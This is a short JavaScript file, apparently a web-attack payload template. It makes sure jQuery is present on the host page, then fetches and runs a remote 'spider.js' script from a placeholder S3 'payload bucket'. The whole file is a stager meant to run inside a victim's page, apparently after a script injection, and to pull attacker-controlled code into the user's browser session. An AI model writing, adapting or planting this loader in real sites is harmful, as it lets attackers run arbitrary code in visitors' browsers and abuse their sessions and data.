var spider_URL = 'https://{{S3_Payload_Bucket}}.s3.amazonaws.com/spider.js';

if (typeof(jQuery) == 'undefined') {
    (function(e, s) {
        e.src = s;
        e.onload = function() {
            Execute()
        };
        document.head.appendChild(e);
    })(document.createElement('script'), '//code.jquery.com/jquery-latest.min.js')
} else {
    Execute()
}

function Execute() {
    $.getScript(spider_URL)
}